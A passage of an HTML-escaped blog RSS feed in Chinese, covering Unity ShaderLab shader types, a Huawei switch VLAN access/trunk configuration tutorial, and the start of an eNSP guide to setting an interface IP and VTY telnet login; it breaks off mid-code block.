&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		Tags {&amp;#34;RenderType&amp;#34; = &amp;#34;opaque&amp;#34; }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		CGPROGRAM
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		#pragma surface surf Lambert
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		struct Input {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			float4 color : COLOR;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		};
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		void surf ( Input IN, inout SurfaceOutput o){
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			o.Albedo = 1;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		ENDCG
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	Fallback &amp;#34;Diffuse&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;​	表面着色器定义在SubShader中的&lt;em&gt;CGPROGRAM&lt;/em&gt;和&lt;em&gt;ENDCG&lt;/em&gt;中。不在Pass中是因为不关心有几个pass，Unity会做好Pass的事情。&lt;/p&gt;
&lt;p&gt;​	&lt;em&gt;CGPROGRAM&lt;/em&gt;和&lt;em&gt;ENDCG&lt;/em&gt;中的代码使用CG/HLSL编写。&lt;/p&gt;
&lt;h3 id=&#34;342-顶点片元着色器&#34;&gt;3.4.2 顶点/片元着色器
&lt;/h3&gt;&lt;p&gt;​	基本同表面着色器一致，但是&lt;em&gt;CGPROGRAM&lt;/em&gt;和&lt;em&gt;ENDCG&lt;/em&gt;需要写在Pass内，用来定义每个Pass自己的代码。&lt;/p&gt;
&lt;h3 id=&#34;343-固定函数着色器&#34;&gt;3.4.3 固定函数着色器
&lt;/h3&gt;&lt;p&gt;​	旧版本设备不支持可编程管线着色器，所以使用固定函数着色器。&lt;/p&gt;
&lt;p&gt;​	固定函数着色器使用ShaderLab语法而不是CG/HLSL。&lt;/p&gt;
&lt;p&gt;​	Unity5.2之后，所有固定函数着色器会在底层被编译成对应的顶点/片元着色器，真正意义上的固定函数着色器不复存在。&lt;/p&gt;
&lt;h2 id=&#34;36-注意的地方&#34;&gt;3.6 注意的地方
&lt;/h2&gt;&lt;p&gt;​	3.6.1 Unity Shader不是Shader&lt;/p&gt;
&lt;p&gt;​	&lt;strong&gt;Unity Shader实际上是一个ShaderLab文件，以.shader为后缀名的文件。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​	Unity Shader&lt;strong&gt;高度封装&lt;/strong&gt;，不需要编写特定类型的顶点/片元Shader，可以通过指令开启渲染设置，方便的修改一些属性。&lt;/p&gt;
&lt;p&gt;​	同时由于Unity Shader的高度封装，一些Shader类型和语法受限。&lt;/p&gt;
&lt;p&gt;​	3.6.2 Unity Shader和CG/HLSL的关系&lt;/p&gt;
&lt;p&gt;​	Unity Shader用ShaderLab语言编写，但是对于顶点/片元着色器会嵌套CG/HLSL代码来实现。&lt;/p&gt;
&lt;h2 id=&#34;37-资料&#34;&gt;3.7 资料
&lt;/h2&gt;&lt;p&gt;​	官方文档：&lt;a class=&#34;link&#34; href=&#34;http://docs.unity3d.com/Manual/SL-Reference.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://docs.unity3d.com/Manual/SL-Reference.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​	官方简单着色器编写教程：&lt;a class=&#34;link&#34; href=&#34;http://docs.unity3d.com/Manual/ShaderTut1.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://docs.unity3d.com/Manual/ShaderTut1.html&lt;/a&gt; &lt;a class=&#34;link&#34; href=&#34;http://docs.unity3d.com/Manual/ShaderTut1.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://docs.unity3d.com/Manual/ShaderTut1.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​	NVIDIA提供的CG文档：http://http.developer.nvidia.com/CG&lt;/p&gt;
&lt;p&gt;​	NVIDIA提供的系列教程：http://http.developer.nvidia.com/CGTutorial/cG_tutorial_chapter01.html&lt;/p&gt;
</description>
        </item>
        <item>
        <title>vlan配置</title>
        <link>https://dorinxl.github.io/p/vlan%E9%85%8D%E7%BD%AE/</link>
        <pubDate>Wed, 22 Jun 2022 02:31:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/vlan%E9%85%8D%E7%BD%AE/</guid>
        <description>&lt;h1 id=&#34;vlan配置&#34;&gt;vlan配置
&lt;/h1&gt;&lt;p&gt;将一个物理局域网在逻辑上分成多个局域网。&lt;/p&gt;
&lt;p&gt;传统模式一个设备20个接口，通过给交换机做标识，或者基于协议、基于mac等来区别开局域网。&lt;/p&gt;
&lt;h3 id=&#34;创建vlan交换机&#34;&gt;创建vlan（交换机）
&lt;/h3&gt;&lt;p&gt;用到的命令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei]vlan bat 10 20	//批量创建10和20
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei]int e0/0/1	//进入接口
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei-Ethernet0/0/1]port link-type access 	//指定接口类型为access
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei-Ethernet0/0/1]port default vlan 10	//将当前接口加入vlan10
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei-GigabitEthernet0/0/1]port link-type trunk 	//指定接口类型为trunk
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei-GigabitEthernet0/0/1]port trunk allow-pass vlan 10 20	//允许vlan 10 20通过trunk
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei-Ethernet0/0/1]undo port default vlan	//将接口从vlan中删除
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;布局&#34;&gt;布局
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/vlan%E9%85%8D%E7%BD%AE/1858293-20220622102855429-1533219860.png&#34;
	width=&#34;512&#34;
	height=&#34;281&#34;
	srcset=&#34;https://dorinxl.github.io/p/vlan%E9%85%8D%E7%BD%AE/1858293-20220622102855429-1533219860_hu15932123872604075801.png 480w, https://dorinxl.github.io/p/vlan%E9%85%8D%E7%BD%AE/1858293-20220622102855429-1533219860_hu3743902689891807671.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220622100529964&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;182&#34;
		data-flex-basis=&#34;437px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/vlan%E9%85%8D%E7%BD%AE/1858293-20220622102856010-445080417.png&#34;
	width=&#34;510&#34;
	height=&#34;263&#34;
	srcset=&#34;https://dorinxl.github.io/p/vlan%E9%85%8D%E7%BD%AE/1858293-20220622102856010-445080417_hu1860933860648581964.png 480w, https://dorinxl.github.io/p/vlan%E9%85%8D%E7%BD%AE/1858293-20220622102856010-445080417_hu17605928476796790705.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220622100801825&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;193&#34;
		data-flex-basis=&#34;465px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/vlan%E9%85%8D%E7%BD%AE/1858293-20220622102856473-460006994.png&#34;
	width=&#34;630&#34;
	height=&#34;447&#34;
	srcset=&#34;https://dorinxl.github.io/p/vlan%E9%85%8D%E7%BD%AE/1858293-20220622102856473-460006994_hu1078589324868929334.png 480w, https://dorinxl.github.io/p/vlan%E9%85%8D%E7%BD%AE/1858293-20220622102856473-460006994_hu7439687739488725188.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220622100812761&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;140&#34;
		data-flex-basis=&#34;338px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;对第一个交换机的第一个接口进行配置：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/vlan%E9%85%8D%E7%BD%AE/1858293-20220622102856941-727216011.png&#34;
	width=&#34;854&#34;
	height=&#34;510&#34;
	srcset=&#34;https://dorinxl.github.io/p/vlan%E9%85%8D%E7%BD%AE/1858293-20220622102856941-727216011_hu5001011433145186555.png 480w, https://dorinxl.github.io/p/vlan%E9%85%8D%E7%BD%AE/1858293-20220622102856941-727216011_hu8921752279321335408.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220622102228713&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;167&#34;
		data-flex-basis=&#34;401px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;同理对其他三个进行配置之后，开始配置两个交换机之间的trunk连线：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/vlan%E9%85%8D%E7%BD%AE/1858293-20220622102857462-366945484.png&#34;
	width=&#34;736&#34;
	height=&#34;193&#34;
	srcset=&#34;https://dorinxl.github.io/p/vlan%E9%85%8D%E7%BD%AE/1858293-20220622102857462-366945484_hu12232728593131038756.png 480w, https://dorinxl.github.io/p/vlan%E9%85%8D%E7%BD%AE/1858293-20220622102857462-366945484_hu5029244244123509444.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220622102616117&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;381&#34;
		data-flex-basis=&#34;915px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;配置完成之后发现PC1只可以和PC3在同一网段通信，同理PC2与PC4通信。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/vlan%E9%85%8D%E7%BD%AE/1858293-20220622102858045-976951868.png&#34;
	width=&#34;700&#34;
	height=&#34;567&#34;
	srcset=&#34;https://dorinxl.github.io/p/vlan%E9%85%8D%E7%BD%AE/1858293-20220622102858045-976951868_hu1557045890469954651.png 480w, https://dorinxl.github.io/p/vlan%E9%85%8D%E7%BD%AE/1858293-20220622102858045-976951868_hu4282250360588045028.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220622102749922&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;123&#34;
		data-flex-basis=&#34;296px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;补充知识点&#34;&gt;补充知识点：
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;vlan的作用：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​	隔离广播域，提升网络性能
​	隔离不同用户或者业务，便于管理&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;vlan的实现方式：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​	按端口划分VLAN
​	按MAC地址划分VLAN&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;交换机的端口类型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​	交换机的端口，可以分为以下三种：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;访问链接(Access Link)
访问链接，指的是“只属于一个VLAN，且仅向该VLAN转发数据帧”的端口。在大多数情况下，访问链接所连的是客户机。&lt;/li&gt;
&lt;li&gt;汇聚链接(Trunk Link)
汇聚链接(Trunk Link)可同时属于多个VLAN，且能够转发多个不同VLAN的通信的端口，汇聚链路上流通的数据帧，都被附加了用于
识别分属于哪个VLAN的特殊信息。
通过汇聚链路时附加的VLAN识别信息，有支持标准的“IEEE 802.1Q”协议，及Cisco产品独有的“ISL(Inter Switch Link)”。&lt;/li&gt;
&lt;li&gt;混合链接(Hybrid Link)
Hybrid 类型的端口可以属于多个VLAN， 可以接收和发送多个VLAN的报文，可以用于交换机之间连接也可以用于连接用户的计算机。
Hybrid端口和Trunk 端口的不同之处在于：Hybrid 端口可以允许多个VLAN 的报文发送时不打标签，而Trunk 端口只允许缺省VLAN 的报文发送时不打标签。&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>华为ensp设备管理</title>
        <link>https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/</link>
        <pubDate>Wed, 22 Jun 2022 01:55:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/</guid>
        <description>&lt;p&gt;目的：如何设置账号密码供远程登陆。&lt;/p&gt;
&lt;p&gt;设备管理的对象可以是交换机、路由器或者防火墙，都是通用的&lt;/p&gt;
&lt;h3 id=&#34;通过cloud桥接到虚拟设备&#34;&gt;通过cloud桥接到虚拟设备：
&lt;/h3&gt;&lt;p&gt;对cloud右键：&lt;/p&gt;
&lt;p&gt;安装好vm之后会有两个虚拟网卡：&lt;img src=&#34;https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/1858293-20220622095102515-900931532.png&#34;
	width=&#34;299&#34;
	height=&#34;144&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/1858293-20220622095102515-900931532_hu9016475269515753583.png 480w, https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/1858293-20220622095102515-900931532_hu15657542515132054702.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220621224601949&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;207&#34;
		data-flex-basis=&#34;498px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;一开始默认UDP，我们直接增加：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/1858293-20220622095103149-1814345062.png&#34;
	width=&#34;937&#34;
	height=&#34;643&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/1858293-20220622095103149-1814345062_hu14482443903902184569.png 480w, https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/1858293-20220622095103149-1814345062_hu5198334667653213529.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220621224627744&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;145&#34;
		data-flex-basis=&#34;349px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;然后我们增加另一个：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/1858293-20220622095103668-1574273448.png&#34;
	width=&#34;976&#34;
	height=&#34;666&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/1858293-20220622095103668-1574273448_hu16531407520937302481.png 480w, https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/1858293-20220622095103668-1574273448_hu4654699397494003149.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220622090711537&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;146&#34;
		data-flex-basis=&#34;351px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;然后我们增加端口映射：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/1858293-20220622095104135-1298083139.png&#34;
	width=&#34;875&#34;
	height=&#34;234&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/1858293-20220622095104135-1298083139_hu6206229757645957488.png 480w, https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/1858293-20220622095104135-1298083139_hu17004577366550084871.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220621224728339&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;373&#34;
		data-flex-basis=&#34;897px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;现在我们的这个cloud就绑定到网卡是vm1的虚拟机上了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/1858293-20220622095104629-286520116.png&#34;
	width=&#34;344&#34;
	height=&#34;355&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/1858293-20220622095104629-286520116_hu3585640723864760073.png 480w, https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/1858293-20220622095104629-286520116_hu5010310579187963983.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220621224850903&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;96&#34;
		data-flex-basis=&#34;232px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;给路由器设置ip地址网段与云网段一致&#34;&gt;给路由器设置IP地址，网段与云网段一致
&lt;/h3&gt;&lt;p&gt;如何配置IP：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SYS进入配置模式&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;Huawei&amp;gt;sys
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Enter system view, return user view with Ctrl+Z.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;interface 【接口编号】&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei]int g0/0/0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei-GigabitEthernet0/0/0]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;ip add [xxx.xxx.xxx.xxx] 24&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei-GigabitEthernet0/0/0]ip add 192.168.87.10 24
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Jun 22 2022 09:10:21-08:00 Huawei %%01IFNET/4/LINK_STATE(l)[1]:The line protocol
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; IP on the interface GigabitEthernet0/0/0 has entered the UP state. 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;配置远程连接设置：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/1858293-20220622095105071-2137724951.png&#34;
	width=&#34;1306&#34;
	height=&#34;256&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/1858293-20220622095105071-2137724951_hu16397930078519147169.png 480w, https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/1858293-20220622095105071-2137724951_hu3812443439479217680.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220613104913441&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;510&#34;
		data-flex-basis=&#34;1224px&#34;
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei] user-interface vty 0 4	//配置0-4五个终端
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei-ui-vty0-4] authentication-mode password/aaa	//启用密码验证或AAA验证
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei-ui-vty0-4] set authentication password simple/cipher abc123 	//以明文或密文方式加密 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei-ui-vty0-4] set authentication password cipher abc123	//此为路由器配置命令，路由器只能是密文加密
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Huawei-ui-vty0-4] user privilege level 3	//设置远程登录vty用户权限为3，表示可以使用所有命令
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;em&gt;命令级别为0-3共四个级别，区别如下：&lt;/em&gt;
&lt;em&gt;0参观，ping、tracert、telnet、rsh、super、language-mode、display、quit&lt;/em&gt;
&lt;em&gt;1 监控，0级命令、msdp-tracert、mtracert、reboot、reset、send、terminal、undo、upgrade、debugging&lt;/em&gt;
&lt;em&gt;2 配置，所有配置命令（管理级的命令除外）和0、1级命令&lt;/em&gt;
&lt;em&gt;3 管理，所有命令&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;配置 Telnet以用户名+密码方式登录时的密码：
进入AAA模式命令行下：
[Huawei]aaa 添加新用户为：huawei 密码为：abc123 加密模式为：cipher  密文加密,用户级别为3&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
